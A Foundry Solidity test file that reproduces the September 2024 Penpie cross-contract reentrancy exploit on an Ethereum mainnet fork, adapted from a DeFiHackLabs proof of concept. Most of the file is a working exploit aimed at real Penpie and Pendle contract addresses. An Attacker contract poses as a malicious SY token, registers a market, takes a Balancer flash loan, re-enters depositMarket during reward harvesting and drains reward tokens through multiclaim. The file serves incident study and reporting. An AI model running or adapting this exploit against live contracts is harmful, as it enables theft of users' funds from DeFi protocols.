// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.24;

import "forge-std/Test.sol";

// Reproduction of the Penpie cross-contract reentrancy exploit (2024-09-03, ~$27M).
// Exploit logic adapted from the DeFiHackLabs PoC (author: rotcivegaf); wrapped
// with report-friendly logging. Runs against the REAL Penpie + Pendle contracts
// on an Ethereum mainnet fork at block 20,671,877 (one before the first attack tx).
//
// Root cause: PendleStakingBaseUpg.batchHarvestMarketRewards() has no reentrancy
// guard AND PendleMarketRegisterHelper.registerPenpiePool() trusts ANY market from
// Pendle's permissionless factory. The attacker registers a market backed by a
// malicious SY; during reward harvest the SY re-enters depositMarket() to inflate
// its reward accounting, then multiclaim() drains real reward tokens.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

address constant agETH = 0xe1B4d34E8754600962Cd944B535180Bd758E6c2e;
address constant balancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
address constant rswETH = 0xFAe103DC9cf190eD75350761e95403b7b8aFa6c0;
address constant PENDLE_LPT_0x6010 = 0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe;
address constant PENDLE_LPT_0x038c = 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6;
address constant PendleRouterV4 = 0x888888888889758F76e7103c6CbF23ABbF58F946;
address constant MasterPenpie = 0x16296859C15289731521F199F0a5f762dF6347d0;
address constant PendleYieldContractFactory = 0x35A338522a435D46f77Be32C70E215B813D0e3aC;
address constant PendleMarketFactoryV3 = 0x6fcf753f2C67b83f7B09746Bbc4FA0047b35D050;
address constant PendleMarketRegisterHelper = 0xd20c245e1224fC2E8652a283a8f5cAE1D83b353a;
address constant PendleMarketDepositHelper_0x1c1f = 0x1C1Fb35334290b5ff1bF7B4c09130885b10Fc0f4;
address constant PendleStaking_0x6e79 = 0x6E799758CEE75DAe3d84e09D40dc416eCf713652;

contract PenpieReentrancyTest is Test {
    Attacker attacker;

    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("mainnet"), 20_671_878 - 1);
    }

    function test_ReproducePenpieReentrancy() public {
        console.log("==================================================================");
        console.log(" Penpie cross-contract reentrancy - mainnet fork (block 20,671,877)");
        console.log(" REAL Penpie (PendleStaking/MasterPenpie) + REAL Pendle factories");
        console.log("==================================================================");

        attacker = new Attacker();

        // First tx: register a malicious-SY-backed Pendle market as a Penpie pool.
        // 0x7e7f9548f301d3dd863eac94e6190cb742ab6aa9d7730549ff743bf84cbd21d1
        attacker.createMarket();
        console.log("[1] Malicious market created via permissionless Pendle factory");
        console.log("    and registered in Penpie via registerPenpiePool (trusts any market).");

        // To pass `if (lastRewardBlock != block.number)` of PendleMarketV3.
        vm.roll(block.number + 1);

        // Second tx: flash-loan + reentrant harvest + multiclaim drain.
        // 0x42b2ec27c732100dd9037c76da415e10329ea41598de453bb0c0c9ea7ce0d8e5
        attacker.attack();

        uint256 agETHProfit = IERC20(agETH).balanceOf(address(attacker));
        uint256 rswETHProfit = IERC20(rswETH).balanceOf(address(attacker));
        // Sept 2024 spot: agETH ~ rswETH ~ 1 ETH; ETH ~ $2,400.
        uint256 ethOut = (agETHProfit + rswETHProfit) / 1e18;
        console.log("");
        console.log("[2] batchHarvestMarketRewards -> malicious SY re-enters depositMarket");
        console.log("    -> inflated rewards -> multiclaim() drains real tokens (flash loan repaid).");
        console.log("");
        console.log("==================================================================");
        console.log("  Stolen agETH  = %s", agETHProfit / 1e18);
        console.log("  Stolen rswETH = %s", rswETHProfit / 1e18);
        console.log("  ~ %s ETH extracted in this single tx (~$%s at ~$2,400/ETH)", ethOut, ethOut * 2400);
        console.log("==================================================================");

        assertGt(agETHProfit + rswETHProfit, 0, "no profit extracted");
    }
}

// Minimum contract just to make the hack work (this contract IS the malicious SY).
abstract contract ERC20 {
    string public name = "";
    string public symbol = "";
    uint8 public immutable decimals = 18;
    mapping(address => uint256) public balanceOf;

    function transfer(address to, uint256 amount) public virtual returns (bool) {
        balanceOf[to] += amount;
    }

    function _mint(address to, uint256 amount) internal virtual {
        balanceOf[to] += amount;
    }
}

contract Attacker is ERC20 {
    address PENDLE_LPT;

    uint256 saved_bal;
    uint256 saved_bal1;
    uint256 saved_bal2;
    uint256 saved_value;

    function assetInfo() external view returns (uint8, address, uint8) {
        return (0, address(this), 8);
    }

    function exchangeRate() external view returns (uint256 res) {
        return 1 ether;
    }

    function getRewardTokens() external view returns (address[] memory) {
        if (PENDLE_LPT == msg.sender) {
            address[] memory tokens = new address[](2);
            tokens[0] = PENDLE_LPT_0x6010;
            tokens[1] = PENDLE_LPT_0x038c;
            return tokens;
        }
    }

    function rewardIndexesCurrent() external returns (uint256[] memory) {}

    uint256 claimRewardsCall;

    // Called by the Pendle market during redeemRewards, itself triggered by
    // Penpie's batchHarvestMarketRewards. The 2nd invocation RE-ENTERS Penpie.
    function claimRewards(address user) external returns (uint256[] memory rewardAmounts) {
        if (claimRewardsCall == 0) {
            claimRewardsCall++;
            return new uint256[](0);
        }

        if (claimRewardsCall == 1) {
            IERC20(agETH).approve(PendleRouterV4, type(uint256).max);
            uint256 bal_agETH = IERC20(agETH).balanceOf(address(this));
            {
                Interfaces.SwapData memory swapData =
                    Interfaces.SwapData(Interfaces.SwapType.NONE, address(0), "", false);
                Interfaces.TokenInput memory input =
                    Interfaces.TokenInput(agETH, bal_agETH, agETH, address(0), swapData);
                Interfaces(PendleRouterV4).addLiquiditySingleTokenKeepYt(address(this), PENDLE_LPT_0x6010, 1, 1, input);
            }
            saved_bal = IERC20(PENDLE_LPT_0x6010).balanceOf(address(this));
            IERC20(PENDLE_LPT_0x6010).approve(PendleStaking_0x6e79, saved_bal);
            // RE-ENTRY: deposit flash-loaned liquidity mid-harvest to inflate rewards.
            Interfaces(PendleMarketDepositHelper_0x1c1f).depositMarket(PENDLE_LPT_0x6010, saved_bal);

            IERC20(rswETH).approve(PendleRouterV4, type(uint256).max);
            uint256 bal_rswETH = IERC20(rswETH).balanceOf(address(this));
            {
                Interfaces.SwapData memory swapData =
                    Interfaces.SwapData(Interfaces.SwapType.NONE, address(0), "", false);
                Interfaces.TokenInput memory input =
                    Interfaces.TokenInput(rswETH, bal_rswETH, rswETH, address(0), swapData);
                (saved_value,,,) =
                    Interfaces(PendleRouterV4).addLiquiditySingleTokenKeepYt(address(this), PENDLE_LPT_0x038c, 1, 1, input);
            }
            uint256 bal_0x038c = IERC20(PENDLE_LPT_0x038c).balanceOf(address(this));
            IERC20(PENDLE_LPT_0x038c).approve(PendleStaking_0x6e79, bal_0x038c);
            Interfaces(PendleMarketDepositHelper_0x1c1f).depositMarket(PENDLE_LPT_0x038c, bal_0x038c);
        }
    }

    function createMarket() external {
        (address PT, address YT) =
            Interfaces(PendleYieldContractFactory).createYieldContract(address(this), 1_735_171_200, true);
        PENDLE_LPT = Interfaces(PendleMarketFactoryV3).createNewMarket(
            PT, 23_352_202_321_000_000_000, 1_032_480_618_000_000_000, 1_998_002_662_000_000
        );
        Interfaces(PendleMarketRegisterHelper).registerPenpiePool(PENDLE_LPT);
        _mint(address(YT), 1 ether);
        Interfaces(YT).mintPY(address(this), address(this));
        uint256 bal = IERC20(PT).balanceOf(address(this));
        IERC20(PT).transfer(PENDLE_LPT, bal);
        _mint(address(PENDLE_LPT), 1 ether);
        Interfaces(PENDLE_LPT).mint(address(this), 1 ether, 1 ether);
        IERC20(PENDLE_LPT).approve(PendleStaking_0x6e79, type(uint256).max);
        Interfaces(PendleMarketDepositHelper_0x1c1f).depositMarket(PENDLE_LPT, 999_999_999_999_999_000);
    }

    function attack() external {
        address[] memory tokens = new address[](2);
        tokens[0] = agETH;
        tokens[1] = rswETH;
        uint256[] memory amounts = new uint256[](2);
        saved_bal1 = IERC20(agETH).balanceOf(balancerVault);
        amounts[0] = saved_bal1;
        saved_bal2 = IERC20(rswETH).balanceOf(balancerVault);
        amounts[1] = saved_bal2;
        Interfaces(balancerVault).flashLoan(address(this), tokens, amounts, "");
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        address[] memory _markets = new address[](1);
        _markets[0] = PENDLE_LPT;
        Interfaces(PendleStaking_0x6e79).batchHarvestMarketRewards(_markets, 0);
        Interfaces(MasterPenpie).multiclaim(_markets);

        Interfaces(PendleMarketDepositHelper_0x1c1f).withdrawMarket(PENDLE_LPT_0x6010, saved_bal);
        uint256 bal_this = IERC20(PENDLE_LPT_0x6010).balanceOf(address(this));
        IERC20(PENDLE_LPT_0x6010).approve(PendleRouterV4, bal_this);
        _removeLiquidity(PENDLE_LPT_0x6010, bal_this, agETH);

        Interfaces(PendleMarketDepositHelper_0x1c1f).withdrawMarket(PENDLE_LPT_0x038c, saved_value);
        uint256 bal_0x038c = IERC20(PENDLE_LPT_0x038c).balanceOf(address(this));
        IERC20(PENDLE_LPT_0x038c).approve(PendleRouterV4, bal_0x038c);
        _removeLiquidity(PENDLE_LPT_0x038c, bal_0x038c, rswETH);

        // repay the flash loan
        IERC20(agETH).transfer(balancerVault, saved_bal1);
        IERC20(rswETH).transfer(balancerVault, saved_bal2);
    }

    function _removeLiquidity(address market, uint256 amount, address tokenOut) internal {
        Interfaces.LimitOrderData memory limit = Interfaces.LimitOrderData(
            address(0), 0, new Interfaces.FillOrderParams[](0), new Interfaces.FillOrderParams[](0), ""
        );
        Interfaces.SwapData memory swapData = Interfaces.SwapData(Interfaces.SwapType.NONE, address(0), "", false);
        Interfaces.TokenOutput memory output =
            Interfaces.TokenOutput(tokenOut, 0, tokenOut, address(0), swapData);
        Interfaces(PendleRouterV4).removeLiquiditySingleToken(address(this), market, amount, output, limit);
    }
}

interface Interfaces {
    function createYieldContract(address SY, uint32 expiry, bool doCacheIndexSameBlock)
        external
        returns (address PT, address YT);
    function createNewMarket(address PT, int256 scalarRoot, int256 initialAnchor, uint80 lnFeeRateRoot)
        external
        returns (address market);
    function registerPenpiePool(address _market) external;
    function mintPY(address receiverPT, address receiverYT) external returns (uint256 amountPYOut);
    function mint(address receiver, uint256 netSyDesired, uint256 netPtDesired)
        external
        returns (uint256 netLpOut, uint256 netSyUsed, uint256 netPtUsed);
    function redeemRewards(address user) external returns (uint256[] memory);
    function depositMarket(address _market, uint256 _amount) external;
    function withdrawMarket(address _market, uint256 _amount) external;
    function flashLoan(address recipient, address[] memory tokens, uint256[] memory amounts, bytes memory userData)
        external;
    function batchHarvestMarketRewards(address[] calldata _markets, uint256 minEthToRecieve) external;

    enum SwapType { NONE, KYBERSWAP, ONE_INCH, ETH_WETH }
    struct SwapData { SwapType swapType; address extRouter; bytes extCalldata; bool needScale; }
    struct TokenInput { address tokenIn; uint256 netTokenIn; address tokenMintSy; address pendleSwap; SwapData swapData; }
    function addLiquiditySingleTokenKeepYt(
        address receiver, address market, uint256 minLpOut, uint256 minYtOut, TokenInput calldata input
    ) external payable returns (uint256 netLpOut, uint256 netYtOut, uint256 netSyMintPy, uint256 netSyInterm);

    enum OrderType { SY_FOR_PT, PT_FOR_SY, SY_FOR_YT, YT_FOR_SY }
    struct Order {
        uint256 salt; uint256 expiry; uint256 nonce; OrderType orderType; address token; address YT;
        address maker; address receiver; uint256 makingAmount; uint256 lnImpliedRate; uint256 failSafeRate; bytes permit;
    }
    struct FillOrderParams { Order order; bytes signature; uint256 makingAmount; }
    struct LimitOrderData {
        address limitRouter; uint256 epsSkipMarket; FillOrderParams[] normalFills; FillOrderParams[] flashFills; bytes optData;
    }
    struct TokenOutput { address tokenOut; uint256 minTokenOut; address tokenRedeemSy; address pendleSwap; SwapData swapData; }
    function removeLiquiditySingleToken(
        address receiver, address market, uint256 netLpToRemove, TokenOutput calldata output, LimitOrderData calldata limit
    ) external returns (uint256 netTokenOut, uint256 netSyFee, uint256 netSyInterm);

    function multiclaim(address[] calldata _stakingTokens) external;
}
